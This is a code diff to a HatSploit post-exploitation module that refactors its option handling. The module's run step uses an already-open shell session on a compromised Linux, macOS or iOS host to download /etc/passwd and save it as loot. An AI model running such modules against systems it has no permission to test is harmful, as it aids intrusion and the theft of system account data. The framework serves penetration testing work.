@@ -4,7 +4,7 @@ Current source: https://github.com/EntySec/HatSploit
 """
 
 from hatsploit.lib.loot import Loot
-from hatsploit.lib.module import Module
+from hatsploit.lib.module.basic import *
 from hatsploit.lib.sessions import Sessions
 
 
@@ -24,26 +24,10 @@ class HatSploitModule(Module, Sessions):
             'Rank': "medium",
         }
 
-        self.options = {
-            'SESSION': {
-                'Description': "Session to run on.",
-                'Value': None,
-                'Type': {
-                    'session': {
-                        'Platforms': ['linux', 'unix', 'macos', 'apple_ios'],
-                        'Type': 'shell',
-                    }
-                },
-                'Required': True,
-            },
-            'PATH': {
-                'Description': "Path to save file.",
-                'Value': Loot().specific_loot('passwd'),
-                'Type': None,
-                'Required': True,
-            },
-        }
+        self.session = SessionOption(None, "Session to run on.", True,
+                                     platforms=['linux', 'unix', 'macos', 'apple_ios'],
+                                     type='shell')
+        self.path = Option(Loot().specific_loot('passwd'), "Path to save file.", True)
 
     def run(self):
-        session, path = self.parse_options(self.options)
-        self.session_download(session, '/etc/passwd', path)
+        self.session_download(self.session.value, '/etc/passwd', self.path.value)
